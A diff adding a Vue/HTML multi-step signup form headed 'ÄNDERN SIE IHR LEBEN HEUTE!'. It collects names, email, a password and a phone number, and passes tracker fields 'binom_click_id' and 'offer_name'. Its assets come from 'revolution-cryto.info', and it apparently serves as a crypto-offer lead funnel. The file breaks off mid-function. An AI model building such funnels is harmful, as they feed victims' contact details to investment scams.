@@ -1,0 +1,1109 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.11"></script>
+    <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+    <meta name="viewport" content="initial-scale=1, maximum-scale=3, minimum-scale=1, user-scalable=no">
+    <!-- `width=device-width` 会导致 iPhone 5 添加到主屏后以 WebApp 全屏模式打开页面时出现黑边 http://bigc.at/ios-webapp-viewport-meta.orz -->
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <link rel="stylesheet" type="text/css"
+        href="https://intl-tel-input.com/node_modules/intl-tel-input/examples/css/isValidNumber.css?1613236686837">
+    <link rel="stylesheet" href="css/intlTelInput.css">
+    <link rel="stylesheet" href="css/demo.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="js/intlTelInput.js"></script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+        }
+
+        body,
+        button,
+        input,
+        select,
+        textarea {
+            font-family: "Open Sans", sans-serif;
+        }
+
+        #app {
+            padding: 8px;
+        }
+
+        .form-container {
+            box-shadow: 0px 4px 20.9px 3.1px rgb(13, 13, 13, .43);
+            padding: 0;
+        }
+
+        .form-container .formHeader {
+            background-image: url(https://revolution-cryto.info/img/form-header-bg.jpg);
+            background-position: center;
+            -webkit-background-size: cover;
+            -moz-background-size: cover;
+            -o-background-size: cover;
+            background-size: cover;
+            background-repeat: no-repeat;
+            text-align: center;
+            color: white;
+            font-weight: 700;
+            margin: 0;
+            padding: 30px 20px;
+            padding-top: 10px;
+            font-size: 1.7rem;
+            letter-spacing: 2px;
+            line-height: 1.2;
+        }
+
+        .form-body {
+            padding: 0 10px 5px 10px;
+            position: relative;
+            margin-top: -20px;
+            background-image: url(https://revolution-cryto.info/img/form-bg.jpg);
+        }
+
+        .login-form {
+            height: initial;
+            min-height: 305px;
+            position: relative;
+            height: 320px;
+            padding-top: 1px;
+            box-sizing: border-box;
+        }
+
+        .step-section {
+            content: none !important;
+            display: flex;
+            justify-content: space-around;
+            margin: 10px 0;
+        }
+
+
+
+        .parent-step:not(:first-child)::before {
+            content: "";
+            display: block;
+            width: 50%;
+            height: 4px;
+            background-color: rgba(200, 200, 200, 0.5);
+            position: absolute;
+            left: 0;
+            top: 50%;
+            margin-top: -2px;
+        }
+
+        .step-section .parent-step:not(:last-child)::after {
+            content: "";
+            display: block;
+            width: 50%;
+            height: 4px;
+            background-color: rgba(200, 200, 200, 0.5);
+            position: absolute;
+            right: 0;
+            top: 50%;
+            margin-top: -2px;
+        }
+
+        .parent-step {
+            position: relative;
+            width: 100%;
+            text-align: center;
+        }
+
+        .parent-step.active::after,
+        .parent-step.active::before {
+            background-color: #3876f2 !important;
+        }
+
+        .step-section .step {
+            width: 26px;
+            height: 26px;
+            line-height: 10px;
+            border-radius: 100px;
+            background-color: rgba(200, 200, 200, 1);
+            color: white;
+            text-align: center;
+            padding: 8px 0 0 0;
+            font-size: 0.8em;
+            box-sizing: border-box;
+            box-shadow: 0px 0px 6px 0px rgb(0 0 0 / 33%);
+            cursor: pointer;
+            display: inline-block;
+            z-index: 10;
+            position: relative;
+            min-height: 0px !important;
+        }
+
+        .step-section .step.active {
+            background-color: #3876f2;
+        }
+
+        .page {
+            height: calc(100% - 128px);
+            height: 100%;
+            box-sizing: border-box;
+            flex-direction: column;
+            /* display: none; */
+            position: relative;
+        }
+
+        input {
+            background: #fafafa;
+            color: #666;
+            border: 1px solid #ccc;
+            border-radius: 0;
+            padding: 10px 15px;
+            box-sizing: border-box;
+            max-width: 100%;
+        }
+
+        .parentInput {
+            border-radius: 3px;
+            width: 100%;
+            height: 35px;
+            position: relative;
+            z-index: 2;
+            box-sizing: border-box;
+            box-shadow: 2px 2px 4px 0px rgb(0, 0, 0, 0.15);
+        }
+
+        .parentInput input {
+            height: 100% !important;
+            width: 100%;
+            border: none;
+            padding: 0 10px;
+            box-sizing: border-box;
+            border-radius: inherit;
+            border: 1px solid rgb(230, 230, 230);
+        }
+
+        .parentInput span.placeholder {
+            position: absolute;
+            display: block;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            white-space: nowrap !important;
+        }
+
+        .parentInput span.placeholder::after {
+            font-size: 18px;
+            color: #999999;
+            line-height: 1.2;
+            content: attr(data-placeholder);
+            position: absolute;
+            top: 6px;
+            left: 6px;
+            padding-left: 5px;
+            -webkit-transition: all 0.4s;
+            -o-transition: all 0.4s;
+            -moz-transition: all 0.4s;
+            transition: all 0.4s;
+            box-sizing: border-box;
+            width: max-content;
+            height: min-content;
+            border: 1px solid rgba(230, 230, 230, 0);
+            border-radius: 3px;
+            z-index: 10;
+        }
+
+        .parentInput,
+        .button_submit {
+            margin-top: 25px;
+        }
+
+        .error_input {
+            position: absolute;
+            top: 35px;
+            left: 11px;
+            padding: 2px 15px;
+            z-index: 999;
+            border: 1px solid rgba(255, 0, 0, 0.5);
+            background-color: rgba(255, 0, 0, 0.3);
+            border-radius: 4px;
+            -moz-border-radius: 4px;
+            -webkit-border-radius: 4px;
+            font-size: 12px;
+            white-space: nowrap !important;
+            width: content-box;
+            height: content-box;
+        }
+
+        .button_submit {
+            position: relative;
+            margin-top: 25px;
+            color: rgb(255, 255, 255);
+            cursor: pointer;
+            text-shadow: rgb(0 0 0 / 20%) 0px 1px 5px;
+            border: none;
+            box-shadow: 0px 4px 6px 0px rgb(0 0 0 / 33%);
+            background: rgb(56, 118, 242);
+            border-radius: 3px;
+            font: normal normal 500 normal 30px / 30px Ubuntu, sans-serif;
+            width: 100%;
+            height: 53px;
+            /* padding: 11px 5px; */
+            position: absolute;
+            bottom: 0;
+            margin-bottom: 10px;
+            box-sizing: border-box;
+            font-family: "Open Sans", sans-serif;
+        }
+
+        .button_submit button {
+            width: 100%;
+            height: 100%;
+            background: none;
+            border: none;
+            font-size: inherit;
+            color: inherit;
+            cursor: inherit;
+            padding: 1px 6px !important;
+        }
+
+        a,
+        input,
+        button {
+            -webkit-appearance: button;
+            transition: color .1s ease-in-out, background-color .1s ease-in-out;
+        }
+        .using-mouse  {
+            position: relative;
+        }
+        .using-mouse :focus {
+            outline: 0;
+        }
+
+        .login-form p {
+            padding: 40px 6px 10px;
+            background-color: #f2f2f2;
+            margin: 0 3px;
+            border-radius: 3px;
+            position: absolute;
+            display: block;
+            top: 23px;
+            z-index: 1;
+            font-size: 0.9em;
+            display: none;
+            width: calc(100% - 6px);
+            padding: 10px 6px 10px;
+            position: relative;
+            top: 0;
+            box-sizing: border-box;
+            display: block;
+        }
+
+        .login-form p .cbx {
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            display: flex;
+            align-items: center;
+            font-size: 1em;
+            margin: 9px 0;
+        }
+
+        .login-form .cbx.active span:first-child {
+            border-color: #3c53c7;
+            background: #3c53c7;
+            animation: check .6s ease;
+        }
+
+        .login-form .cbx span:first-child {
+            flex: 0 0 16px;
+            width: 16px;
+            height: 16px;
+        }
+
+        .login-form .cbx span:first-child {
+            position: relative;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            transform: scale(1);
+            vertical-align: middle;
+            border: 1px solid #B9B8C3;
+            transition: all 0.2s ease;
+        }
+
+        .login-form .cbx span {
+            display: inline-block;
+            vertical-align: middle;
+            transform: translate3d(0, 0, 0);
+            line-height: 1em;
+            font-size: 1em;
+        }
+
+        .login-form .cbx.active span:first-child:before {
+            transform: scale(2.2);
+            opacity: 0;
+            transition: all .6s ease;
+        }
+
+        .login-form .cbx span:first-child:before {
+            content: "";
+            width: 100%;
+            height: 100%;
+            background: #3876f2;
+            display: block;
+            transform: scale(0);
+            opacity: 1;
+            border-radius: 50%;
+            transition-delay: 0.2s;
+        }
+
+        .login-form .cbx span:first-child svg {
+            position: absolute;
+            z-index: 1;
+            top: -1px;
+            left: 1px;
+            fill: none;
+            stroke: white;
+            stroke-width: 3;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            stroke-dasharray: 16px;
+            stroke-dashoffset: 16px;
+            transition: all 0.3s ease;
+            transition-delay: 0.1s;
+            transform: translate3d(0, 0, 0);
+            width: 10px;
+            height: 10px;
+        }
+
+        .login-form .cbx span:first-child svg {
+            top: 3px;
+            left: 3px;
+        }
+
+        .login-form .cbx.active span:first-child svg {
+            stroke-dashoffset: 0;
+        }
+
+        .login-form .cbx.active span:last-child {
+            text-decoration: line-through;
+        }
+
+        .login-form .cbx.active span:last-child {
+            color: #B9B8C3;
+            transition: all .3s ease;
+        }
+
+        .login-form .cbx span:last-child {
+            margin-left: 5px;
+        }
+
+        .login-form .cbx span {
+            display: inline-block;
+            vertical-align: middle;
+            transform: translate3d(0, 0, 0);
+            line-height: 1em;
+            font-size: 1em;
+        }
+    </style>
+    <style>
+        .page3 .parentInput input {
+            padding-left: 100px;
+            padding-right: 6px;
+            position: relative;
+            z-index: 0;
+            margin-top: 0 !important;
+            padding-right: 36px;
+        }
+
+        .iti__flag-container {
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            right: auto;
+            left: 0;
+            padding: 0;
+            border-radius: inherit;
+        }
+
+        .iti__arrow {
+            margin-left: 6px;
+            width: 0;
+            height: 0;
+            border-left: 3px solid transparent;
+            border-right: 3px solid transparent;
+            border-top: 4px solid #555;
+        }
+
+        .iti__selected-dial-code {
+            margin-left: 6px;
+        }
+
+        .iti__flag {
+            width: 20px;
+            height: 12px;
+            background-color: #DBDBDB;
+            line-height: 0;
+        }
+
+        .iti__country-list {
+            position: absolute;
+            z-index: 2;
+            list-style: none;
+            text-align: left;
+            padding: 0;
+            margin: 0 0 0 -1px;
+            box-shadow: 1px 1px 4px rgb(0 0 0 / 20%);
+            background-color: white;
+            border: 1px solid #CCC;
+            white-space: nowrap;
+            max-height: 200px;
+            overflow-y: scroll;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .iti__country {
+            padding: 5px 10px;
+            outline: none;
+            display: flex;
+            align-items: center;
+        }
+
+        .iti__country:hover {
+            background-color: rgba(0, 0, 0, 0.05);
+            cursor: pointer;
+        }
+
+        .iti__country-name {
+            margin-right: 6px;
+            vertical-align: middle;
+            display: inline-block;
+        }
+
+        .iti__dial-code {
+            vertical-align: middle;
+            color: #999;
+        }
+
+        .iti {
+            position: relative;
+            height: 100%;
+            border-radius: inherit;
+            display: block;
+        }
+
+        .iti__selected-flag {
+            z-index: 1;
+            position: relative;
+            display: flex;
+            align-items: center;
+            height: 100%;
+            padding: 0 6px 0 8px;
+            border-top-left-radius: inherit;
+            border-bottom-left-radius: inherit;
+            background-color: rgba(0, 0, 0, 0.05);
+        }
+
+        input[type=text]:focus,
+        input[type=email]:focus,
+        input[type=url]:focus,
+        input[type=password]:focus,
+        input[type=search]:focus,
+        input[type=tel]:focus,
+        input[type=number]:focus,
+        textarea:focus,
+        select:focus {
+            color: #666;
+            background-color: #fff;
+            border-color: #bfbfbf;
+        }
+
+        .login-form input:focus+span.placeholder::after {
+            top: -21px;
+            font-size: 15px;
+            background: white;
+            border: 1px solid rgb(230, 230, 230);
+            padding: 0 10px;
+        }
+
+        .fade-enter-active,
+        .fade-leave-active {
+            transition: opacity .5s;
+        }
+
+        .fade-enter,
+        .fade-leave-to
+
+        /* .fade-leave-active below version 2.1.8 */
+            {
+            opacity: 0;
+        }
+
+        .login-form .has-val+span.placeholder::after,
+        .iti+span.placeholder::after {
+            top: -15px;
+            font-size: 15px;
+            background: white;
+            border: 1px solid rgb(230, 230, 230);
+            padding: 0 10px;
+        }
+
+        .generate {
+            position: absolute;
+            height: 100%;
+            width: 35px;
+            padding: 8px;
+            box-sizing: border-box;
+            right: 3px;
+        }
+
+        .generate img {
+            height: 100%;
+            cursor: pointer;
+        }
+
+        @media only screen and (min-width: 768px) {
+            .form-container {
+                width: 33.33%
+            }
+        }
+
+        .iti__flag.iti__hn {
+            height: 10px;
+        }
+
+        .iti__flag-box,
+        .iti__country-name {
+            margin-right: 6px;
+            display: inline-block;
+        }
+
+        .iti__flag-box {
+            margin-right: 6px;
+            width: 20px;
+        }
+
+        .padding88 {
+            padding-left: 88px !important;
+        }
+
+        #valid-msg {
+            position: absolute;
+            right: 10px;
+            top: 8px;
+        }
+
+        .loading {
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+        }
+
+        .loading img {
+            z-index: 100;
+            top: 20%;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, 0%);
+        }
+    </style>
+</head>
+
+<body>
+    <div id="app" style="position: relative;">
+        <div class="form-container using-mouse">
+            <h1 class="formHeader">
+                ÄNDERN SIE IHR LEBEN HEUTE!
+            </h1>
+            <div class="formwrap-outer">
+                <div class="formwrap">
+                    <div class="form-body">
+                        <form class="login-form" id="formid" action="https://www.baidu.com" method="post">
+                            <div class="step-section">
+                                <div class="parent-step" :class="{'active':current>=index+1}"
+                                    v-for="(item,index) in stepArr" @click="clickStep(index)">
+                                    <div class="step" :class="{'active':current>=index+1}">
+                                        <span>{{item}}</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="page page1" v-if="current===1">
+                                <div class="parentInput" v-for="(item,index) in page1Form">
+                                    <input v-model="form[item.model]" type="text"
+                                        :class="{'has-val':form[item.model]}" />
+                                    <span class="placeholder" :data-placeholder="item.name"></span>
+                                    <transition name="fade">
+                                        <span class="error error_input" v-show="item.isError">
+                                            {{item.errorMsg}}
+                                        </span>
+                                    </transition>
+                                </div>
+                            </div>
+
+                            <div class="page page2" v-if="current===2">
+                                <div class="parentInput">
+                                    <input v-model="form.password" :class="{'has-val':form.password}"
+                                        style="font-size: 100%;padding-right: 35px;" />
+                                    <span class="placeholder" data-placeholder="Password"></span>
+                                    <transition name="fade">
+                                        <span class="error error_input" v-show="form.ispasswordError">
+                                            Specify the correct password
+                                        </span>
+                                    </transition>
+                                    <span class="generate">
+                                        <img @click="generateNewPassword"
+                                            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QzNDQTA4N0I1QzI2MTFFQUExMkJEQ0NBMjZBRDk5M0EiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QzNDQTA4N0M1QzI2MTFFQUExMkJEQ0NBMjZBRDk5M0EiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpDM0NBMDg3OTVDMjYxMUVBQTEyQkRDQ0EyNkFEOTkzQSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpDM0NBMDg3QTVDMjYxMUVBQTEyQkRDQ0EyNkFEOTkzQSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PvJ7niEAAARVSURBVHjaYvz//z8DseDjx49cZ86cMQJi4xs3bqg/f/5c9N+/fyyCgoKfFBUV7xsYGFwyNTU9rays/BiXGeXl5bW9vb1lM2fOzEhOTl7KAHIAIXzy5En9zMzMXmlp6RtAM/4A8X9cmI2N7bWLi8uGxYsXh3z58oUN2Zza2toyoJp/IHXR0dEzwZ7HZ/GtW7cUQkJCFgI1/MZnKS6spKR0YcWKFQG/f/9mqAECZDmgA2bgdcCCBQvC2dnZX5JjMTrW0dE5ji4GdMB0nA4ABlUVNSzGh2EOYEFPJHV1dVXNzc2t+BIjKyvre3V19dtSUlLPmJmZf3/69Eno9u3bSq9evVJkIBWgBXsYPlebmJjsnzdvXuTjx48l0EMN6AjOQ4cOmaenp0/g4+N7RmwIwA24c+eOLNBnb3Gl7FmzZsX8/fuXqFwDTLjzSHaAv7//EmwKxcXF7wDzvTYxFoNwbm5uBylpAKzp9OnTutjyN8jnFy5c0CDGYmCBBLK8k9RECNackpIyCZui2bNnRxLr8/b29gJSckFkZCS4IGICFq/cmzZt8kFPnIaGhkeAReVyYhPz/fv3FUhJ/FxcXN9BNOPOnTvt3N3dD4DYyApABVF8fPwqYg389u0bx/Hjxy2BpR4H1Jd4M5++vv55SUnJVwzAPF+CHjzA3PABWNGIEBv8lGAWYK2mge48TU3NGxISEm8YqAj+/PnDCEyojMihw8TExMDy7NkzKXTFoqKirxmoDMrKyurXrl0bgixmbW19gkVMTOwFsD5/iCwBjJuH1HbAw4cPVR49eqSNLAYM5bcswKI1Axg8zMgSLCwsf6ntgDdv3oiiiwEd8JwFmB1+MdAYfP78mfPSpUva6OKgCg1cG3748IH32rVrOuhZEQtgBNZ+v4BZ6AIHB8dvYh1w+PBhK6Ad0ujiZmZmp8FZoaKiopaUUgxYPkwnJau5ubmtw1LMv3n69KkoEzQE+EkJUmB1+5FYtVu3bnXctWtXALq4h4fHbmB74jXYhdnZ2URXIsHBwYu+f//OSozPge0GcWAuu4vNnO3btzvAKyNiHQC0fOGvX7+YiLEcWDdIaWlpncJmjoWFxW5Q7UmSA5ycnNYTG+cbN250A/r8DjZzGBkZf5w6dUoPppZoBwALq8eFhYVtwLaD/s+fP5nRLX3//j3P5s2b3by8vFbjM6etrS0fWR/JaQCI/8rLy18F1qDrgXX67LCwsPm2trY7gQ58REhvUlLSFHSHk+MAsjCwbTEFFu9EOQDoyyvUsBhY430DtZZwpReYA7qQNSUmJk4F9esWLlwYBuwPXiPXcjs7u+3ARoohvgQLJoAdz26keOpHDipgIcUF7MnGAqvOXcBK6hMhS3l4eJ4Bs+vibdu2ORGTYxhBxLJly4JiY2MXAX0+D9gQzQNmFayl2tWrV1VOnDhhfv78eX1g1aoAdBwfqLcLzHJvVFVV7wLL9rPm5uYnwSUckQAgwAAYpkj6EBO9nQAAAABJRU5ErkJggg==">
+                                    </span>
+                                </div>
+                                <p class="message">
+                                    <span v-for="(p,index) in pageForm2message" class="cbx"
+                                        :class="{'active':allowIndex[index+1]}">
+                                        <span>
+                                            <svg width="12px" height="9px" viewBox="0 0 12 9">
+                                                <polyline points="1 5 4 8 11 1"></polyline>
+                                            </svg>
+                                        </span>
+                                        <span lang="inner:password_valid_uppercase">
+                                            {{p}}
+                                        </span>
+                                    </span>
+                                </p>
+                            </div>
+
+                            <div class="page page3" v-show="current===3">
+                                <div class="enter_number">
+                                    <div class="parentInput">
+                                        <input id="phone" type="tel" v-model="form.phone">
+                                        <span class="placeholder" data-placeholder="Phone"></span>
+                                        <transition name="fade">
+                                            <span class="error error_input" v-show="form.isphoneError">
+                                                {{form.isphoneErrormsg}}
+                                            </span>
+                                        </transition>
+                                        <span id="valid-msg" class="hide">✓ Valid</span>
+                                        <!--  <span id="error-msg" class="hide"></span> -->
+                                    </div>
+                                </div>
+                            </div>
+
+                            <input type="hidden" name="Firstname" v-model="submiForm.Firstname" />
+                            <input type="hidden" name="Lastname" v-model="submiForm.Lastname" />
+                            <input type="hidden" name="Email" v-model="submiForm.Email" />
+                            <input type="hidden" name="Password" v-model="submiForm.Password" />
+                            <input type="hidden" name="Countrycode" v-model="submiForm.Countrycode" />
+                            <input type="hidden" name="PhoneCode" v-model="submiForm.PhoneCode" />
+                            <input type="hidden" name="PhoneNumber" v-model="submiForm.PhoneNumber" />
+                            <input type="hidden" name="binom_click_id" v-model="submiForm.binom_click_id" />
+                            <input type="hidden" name="offer_name" v-model="submiForm.offer_name" />
+
+                            <!-- button submit-->
+                            <div class="button_submit">
+                                <button type="button" @click="handleSubmit">Next</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+
+            <div class="loading" v-show="loading">
+                <img src="loading/loading-spinning-bubbles.svg">
+            </div>
+        </div>
+
+    </div>
+</body>
+<script>
+    const notAllowNull = "the field cannot empty";
+    const notAllowNumber = "Must not contains numbers";
+    const notAllowErrorEmail = "Specify the correct e-email";
+    var vm = new Vue({
+        el: '#app',
+        data() {
+
+
+
+            return {
+                stepArr: ['I', 'II', 'III'],
+                form: {
+                    firstName: "",
+                    lastName: "",
+                    email: "",
+                    password: "",
+                    countryCode: "",
+                    phone: "",
+                    ispasswordError: false,
+                    isphoneError: false,
+                    isphoneErrormsg: ""
+                },
+                loading: false,
+                page1Form: [{
+                    name: 'First name',
+                    model: 'firstName',
+                    isError: false,
+                    errorMsg: notAllowNull
+                },
+                {
+                    name: 'Last name',
+                    model: 'lastName',
+                    isError: false,
+                    errorMsg: notAllowNull
+                },
+                {
+                    name: 'E-mail address',
+                    model: 'email',
+                    isError: false,
+                    errorMsg: notAllowNull
+                }
+                ],
+                pageForm2message: [
+                    'Must contain at least one uppercase letter',
+                    'Must contain at least one lowercase letter',
+                    'Must contain at least one digit',
+                    'The password must be 8-12 characters long'
+                ],
+                notAllowNull,
+                notAllowNumber,
+                current: 1,
+                isCountryActive: false,
+                allowIndex: {
+                    1: true,
+                    2: true,
+                    3: true,
+                    4: true
+                },
+                currentCountry: {},
+                selectVisible: false,
+                submiForm: {},
+                iti: null,
+                errorMap: []
+            }
+        },
+        mounted() {
+            const self = this;
+            this.generateNewPassword();
+
+            var input = document.querySelector("#phone");
+            var errorMsg = document.querySelector("#error-msg"),
+                validMsg = document.querySelector("#valid-msg");
+            var iti = window.intlTelInput(input, {
+                // allowDropdown: false,
+                // autoHideDialCode: false,
+                // autoPlaceholder: "off",
+                // dropdownContainer: document.body,
+                // excludeCountries: ["us"],
+                // formatOnDisplay: false,
+                geoIpLookup: function (callback) {
+                    $.get("http://ipinfo.io", function () { }, "jsonp").always(function (resp) {
+                        var countryCode = (resp && resp.country) ? resp.country : "";
+                        callback(countryCode);
+                    });
+                },
+                // hiddenInput: "full_number",
+                initialCountry: "auto",
+                // localizedCountries: { 'de': 'Deutschland' },
+                // nationalMode: false,
+                // onlyCountries: ['us', 'gb', 'ch', 'ca', 'do'],
+                // placeholderNumberType: "MOBILE",
+                // preferredCountries: ['cn', 'jp'],
+                separateDialCode: true,
+                utilsScript: "js/utils.js",
+            });
+            this.iti = iti;
+
+            // here, the index maps to the error code returned from getValidationError - see readme
+            var errorMap = ["Invalid number", "Invalid country code", "Too short", "Too long", "Invalid number"];
+            this.errorMap = errorMap;
+            // initialise plugin
+            //var iti = window.intlTelInput(input, {
+            //  utilsScript: "../../build/js/utils.js?1613236686837"
+            //});
+
+            var reset = function () {
+                // input.classList.remove("error");
+                // errorMsg.innerHTML = "";
+                // errorMsg.classList.add("hide");
+                validMsg.classList.add("hide");
+            };
+
+            // on blur: validate
+            input.addEventListener('blur', function () {
+                reset();
+                if (!self.form.phone) {
+                    self.form.isphoneError = true;
+                    self.form.isphoneErrormsg = 'the phone is required';
+                    setTimeout(() => {
+                        self.form.isphoneError = false;
+                    }, 2000);
+                    return;
+                }
+                if (self.form.phone) {
+                    if (iti.isValidNumber()) {
+                        self.form.isphoneError = false;
+                        validMsg.classList.remove("hide");
+                    } else {
+                        var errorCode = iti.getValidationError();
+                        self.form.isphoneError = true;
+                        self.form.isphoneErrormsg = self.errorMap[errorCode] || 'is Valid Phone';
+                        setTimeout(() => {
+                            self.form.isphoneError = false;
+                        }, 2000)
+                        return;
+                    }
+                }
+            });
+
+            // on keyup / change flag: reset
+            input.addEventListener('change', reset);
+            input.addEventListener('keyup', reset);
+
+        },
+        watch: {
+            'form.password': {
+                handler(newval) {
+                    console.log("watch" + newval)
+                    //如果匹配至少一个大写字母
+                    if (/[A-Z]+/.test(newval)) {
+                        this.allowIndex[1] = true
+                    } else {
+                        this.allowIndex[1] = false
+                    }
+                    //如果匹配至少一个小写字母
+                    if (/[a-z]+/.test(newval)) {
+                        this.allowIndex[2] = true
+                    } else {
+                        this.allowIndex[2] = false
+                    }
+                    //如果匹配至少一个数字
+                    if (/[0-9]+/.test(newval)) {
+                        this.allowIndex[3] = true
+                    } else {
+                        this.allowIndex[3] = false
+                    }
+                    if (newval.length >= 8 && newval.length <= 12) {
+                        this.allowIndex[4] = true
+                    } else {
+                        this.allowIndex[4] = false
+                    }
+                },
+                deep: true
+            }
+        },
+        methods: {
+            clickStep: function (index) {
+                console.log("index", index)
+                if (this.current === 3) {
+                    this.current = index + 1;
+                    return;
+                }
+                if (this.current === 2) {
+                    if (index === 2) {
+                        return;
+                    }
+                    this.current = index + 1;
+                    return;
+                }
+                if (this.current === 1) {
+                    if (index === 1 || index === 2) {
+                        return;
+                    }
+                    this.current = index + 1;
+                    return;
+                }
+            },
+            handleClickItem: function (country) {
+                const self = this;
+                this.selectVisible = false;
+                this.currentCountry = {
+                    ...self.currentCountry,
+                    img: country[3],
+                    phone: country[2],
+                    countrycode: country[1]
+                };
+            },
+            generateNewPassword: function () {
+                this.generatePassword(
+                    Math.floor(Math.random() * 4 + 8)
+                )
+            },
+            generatePassword: function (length) {
+                for (var pass, max_length = 12, min_length = 8, result = "", upper =
+                    "ABCDEFGHIJKLMNOPQRSTUVWXYZ", lower = "abcdefghijklmnopqrstuvwxyz", digit =
+                        "0123456789", symbols = upper + lower + digit, i = 0; i < length; i++) {
+                    result += symbols.charAt(Math.floor(Math.random() * symbols.length));
+                }
+
+                result = replaceAt(result, 1, upper.charAt(Math.floor(Math.random() * upper.length))),
+                    result = replaceAt(result, 3, lower.charAt(Math.floor(Math.random() * lower.length))),
+                    result = replaceAt(result, 5, digit.charAt(Math.floor(Math.random() * digit.length))),
+                    /[a-z]/.exec(pass = "" + result) + "" != "null" && /[A-Z]/.exec(pass) + "" != "null" &&
+                        /[0-9]/.exec(pass) + "" != "null" && pass.length >= min_length && pass.length <=
+                        max_length ? result : this.generatePassword(length);
+
+                this.form.password = result
+
+                function replaceAt(str, index, replacement) {
+                    return str.substr(0, index) + replacement + str.substr(index + replacement.length)
+                }
+            },
+            handleSubmit: function () {
+                console.log("-this.form.firstName--", this.form, this.current)
+                var input = document.querySelector("#phone");
+                const self = this;
+                const {
+                    firstName,
+                    lastName,
+                    email,
+                    phone,
+                    password
+                } = this.form;
+                if (this.current === 1) {
+
+
+                    if (!firstName) {
+                        this.page1Form[0].isError = true;
+                        this.page1Form[0].errorMsg = notAllowNull;
+                        this.page1Form = this.page1Form;
+                        setTimeout(() => {
+                            this.page1Form[0].isError = false;
+                        }, 2000)
+                        return;
+                    }
+
+                    if (/[0-9]/.test(firstName)) {
+                        this.page1Form[0].isError = true;
+                        this.page1Form[0].errorMsg = notAllowNumber;
+                        this.page1Form = this.page1Form;
+                        setTimeout(() => {
+                            this.page1Form[0].isError = false;
+                        }, 2000)
+                        return;
+                    }
+                    if (!lastName) {
+                        this.page1Form[1].isError = true;
+                        this.page1Form[1].errorMsg = notAllowNull;
+                        this.page1Form = this.page1Form;
+                        setTimeout(() => {
+                            this.page1Form[1].isError = false;
+                        }, 2000)
+                        return;
+
+                    }
+
+                    if (/[0-9]/.test(lastName)) {
+                        this.page1Form[1].isError = true;
+                        this.page1Form[1].errorMsg = notAllowNumber;
+                        this.page1Form = this.page1Form;
+                        setTimeout(() => {
+                            this.page1Form[1].isError = false;
+                        }, 2000)
+                        return;
+                    }
+
+                    if (!email) {
+                        this.page1Form[2].isError = true
+                        this.page1Form[2].errorMsg = notAllowNull;
+                        this.page1Form = this.page1Form;
+                        setTimeout(() => {
+                            this.page1Form[2].isError = false;
+                        }, 2000)
+                    }
+
+                    if (!/^([a-zA-Z]|[0-9])(\w|\-)+@[a-zA-Z0-9]+\.([a-zA-Z]{2,4})$/.test(email)) {
+                        this.page1Form[2].isError = true;
+                        this.page1Form[2].errorMsg = notAllowErrorEmail;
+                        this.page1Form = this.page1Form;
+                        setTimeout(() => {
+                            this.page1Form[2].isError = false;
+                        }, 2000)
+                        return;
+                    }
+
+                    this.current = 2;
+                    return;
+                }
+                if (this.current === 2) {
+                    let isPass = Object.values(this.allowIndex).findIndex(item => !item) === -1;
+                    if (isPass) {
+                        this.current = 3;
+                        return;
+                    } else {
+                        this.form.ispasswordError = true;
+                        this.form.ispasswordError = this.form.ispasswordError;
+                        setTimeout(() => {
+                            this.form.ispasswordError.ispasswordError = false;
+                        }, 2000)
+                        return;
+                    }
+                }
+                if (this.current === 3) {
+                    console.log("--我进步了乐山--", this.currentCountry)
+                    console.log($('.iti__flag')[0].className.split(" ")[1].split('__')[1].toUpperCase())
+                    const iti = this.iti;
+
+                    if (!phone) {
+                        self.form.isphoneError = true;
